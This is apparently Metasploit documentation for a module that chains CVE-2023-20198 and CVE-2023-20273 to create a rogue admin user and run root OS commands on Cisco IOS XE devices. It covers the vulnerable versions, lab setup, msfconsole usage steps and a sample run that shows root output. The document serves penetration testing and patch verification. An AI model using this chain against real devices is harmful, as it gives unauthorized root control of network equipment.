## Vulnerable Application
This module leverages both CVE-2023-20198 and CVE-2023-20273 against vulnerable instances of Cisco IOS XE
devices which have the Web UI exposed. An attacker can execute arbitrary OS commands with root privileges.

This module leverages CVE-2023-20198 to create a new admin user, then authenticating as this user,
CVE-2023-20273 is leveraged for OS command injection. The output of the command is written to a file and read
back via the webserver. Finally the output file is deleted and the admin user is removed.

The vulnerable IOS XE versions are:

16.1.1, 16.1.2, 16.1.3, 16.2.1, 16.2.2, 16.3.1, 16.3.2, 16.3.3, 16.3.1a, 16.3.4,
16.3.5, 16.3.5b, 16.3.6, 16.3.7, 16.3.8, 16.3.9, 16.3.10, 16.3.11, 16.4.1, 16.4.2,
16.4.3, 16.5.1, 16.5.1a, 16.5.1b, 16.5.2, 16.5.3, 16.6.1, 16.6.2, 16.6.3, 16.6.4,
16.6.5, 16.6.4s, 16.6.4a, 16.6.5a, 16.6.6, 16.6.5b, 16.6.7, 16.6.7a, 16.6.8, 16.6.9,
16.6.10, 16.7.1, 16.7.1a, 16.7.1b, 16.7.2, 16.7.3, 16.7.4, 16.8.1, 16.8.1a, 16.8.1b,
16.8.1s, 16.8.1c, 16.8.1d, 16.8.2, 16.8.1e, 16.8.3, 16.9.1, 16.9.2, 16.9.1a, 16.9.1b,
16.9.1s, 16.9.1c, 16.9.1d, 16.9.3, 16.9.2a, 16.9.2s, 16.9.3h, 16.9.4, 16.9.3s, 16.9.3a,
16.9.4c, 16.9.5, 16.9.5f, 16.9.6, 16.9.7, 16.9.8, 16.9.8a, 16.9.8b, 16.9.8c, 16.10.1,
16.10.1a, 16.10.1b, 16.10.1s, 16.10.1c, 16.10.1e, 16.10.1d, 16.10.2, 16.10.1f, 16.10.1g,
16.10.3, 16.11.1, 16.11.1a, 16.11.1b, 16.11.2, 16.11.1s, 16.11.1c, 16.12.1, 16.12.1s,
16.12.1a, 16.12.1c, 16.12.1w, 16.12.2, 16.12.1y, 16.12.2a, 16.12.3, 16.12.8, 16.12.2s,
16.12.1x, 16.12.1t, 16.12.2t, 16.12.4, 16.12.3s, 16.12.1z, 16.12.3a, 16.12.4a, 16.12.5,
16.12.6, 16.12.1z1, 16.12.5a, 16.12.5b, 16.12.1z2, 16.12.6a, 16.12.7, 16.12.9, 16.12.10,
17.1.1, 17.1.1a, 17.1.1s, 17.1.2, 17.1.1t, 17.1.3, 17.2.1, 17.2.1r, 17.2.1a, 17.2.1v,
17.2.2, 17.2.3, 17.3.1, 17.3.2, 17.3.3, 17.3.1a, 17.3.1w, 17.3.2a, 17.3.1x, 17.3.1z,
17.3.3a, 17.3.4, 17.3.5, 17.3.4a, 17.3.6, 17.3.4b, 17.3.4c, 17.3.5a, 17.3.5b, 17.3.7,
17.3.8, 17.4.1, 17.4.2, 17.4.1a, 17.4.1b, 17.4.1c, 17.4.2a, 17.5.1, 17.5.1a, 17.5.1b,
17.5.1c, 17.6.1, 17.6.2, 17.6.1w, 17.6.1a, 17.6.1x, 17.6.3, 17.6.1y, 17.6.1z, 17.6.3a,
17.6.4, 17.6.1z1, 17.6.5, 17.6.6, 17.7.1, 17.7.1a, 17.7.1b, 17.7.2, 17.10.1, 17.10.1a,
17.10.1b, 17.8.1, 17.8.1a, 17.9.1, 17.9.1w, 17.9.2, 17.9.1a, 17.9.1x, 17.9.1y, 17.9.3,
17.9.2a, 17.9.1x1, 17.9.3a, 17.9.4, 17.9.1y1, 17.11.1, 17.11.1a, 17.12.1, 17.12.1a,
17.11.99SW

## Testing
This module was tested against IOS XE version 16.12.3. To test this module you will need to either:

* Acquire a hardware device running one of the vulnerable firmware versions listed above.

Or

* Setup a virtualized environment.
  * A [CSR1000V](https://www.cisco.com/c/en/us/products/routers/cloud-services-router-1000v-series/index.html) device
    can be virtualized using [GNS3](https://www.gns3.com/) and VMWare Workstation/Player. Follow the
    [Windows setup guide](https://docs.gns3.com/docs/getting-started/installation/windows) to install GNS3 and the
    [topology guide](https://docs.gns3.com/docs/getting-started/your-first-gns3-topology) to learn how GNS3 can be used.
  * A suitable firmware image for testing would be `csr1000v-universalk9.16.12.03-serial.qcow2`.
  * When setting up GNS3, run the `GNS3 2.2.43` Virtual Machine for deploying QEMU based devices.
  * Create a new CSR1000v instance as a QEMU device.
  * The CSR1000v device's first ethernet adapter `Gi1` should be connected to a Cloud device, whose adapter was bridged
    to the physical adapter on the host machine, allowing an IP address to be assigned via DHCP, and allowing the Web UI to
    be accessible to a remote attacker.
  * When the virtual router has booted up, you must enable the vulnerable WebUI component. From a serial console on
    the device:
    ```
    Router>enable
    Router#config
    Router(config)#ip http server
    router(config)#ip http secure-server
    router(config)#ip http authentication local
    router(config)#username admin privilege 15 secret qwerty
    router(config)#exit
    Router#copy running-config startup-config
    ```
  * You should now be able to access the WebUI via https://TARGET_IP_ADDRESS/webui and login with admin:qwerty

## Verification Steps
1. Start msfconsole
2. `use auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set CMD "id"`
5. `run`

## Options

### CMD
A Linux OS command to execute on the target device, e.g. `id`

### CISCO_ADMIN_USERNAME
The username of an admin account. If not set, CVE-2023-20198 is leveraged to first create a new admin account and then
the new account is then removed after the module completes.

### CISCO_ADMIN_PASSWORD
The password of an admin account. If not set, CVE-2023-20198 is leveraged to create a new admin password.

### REMOVE_OUTPUT_TIMEOUT
The maximum timeout (in seconds) to wait when trying to removing the commands output file. The output file
can be locked preventing deleting upon the first attempt, so the module will try again if needed.

## Scenarios

```
msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > show options

Module options (auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273):

   Name                   Current Setting  Required  Description
   ----                   ---------------  --------  -----------
   CISCO_ADMIN_PASSWORD                    no        The password of an admin account. If not set, CVE-2023-20198 is leveraged to c
                                                     reate a new admin password.
   CISCO_ADMIN_USERNAME                    no        The username of an admin account. If not set, CVE-2023-20198 is leveraged to c
                                                     reate a new admin account.
   CMD                    id               yes       The OS command to execute.
   Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   REMOVE_OUTPUT_TIMEOUT  30               yes       The maximum timeout (in seconds) to wait when trying to removing the commands
                                                     output file.
   RHOSTS                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                                     cs/using-metasploit.html
   RPORT                  443              yes       The target port (TCP)
   SSL                    true             no        Negotiate SSL/TLS for outgoing connections
   VHOST                                   no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set rhosts 10.5.135.193
rhosts => 10.5.135.193
msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set verbose true
verbose => true
msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > run
[*] Running module against 10.5.135.193

[*] Created privilege 15 user 'rfojGrqA' with password 'ixnXyFlw'
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:polaris_nginx_t:s0

[*] Removing output file '/var/www/fNrmuBOf'
[*] Removing user 'rfojGrqA'
[*] Auxiliary module execution completed

msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > 
```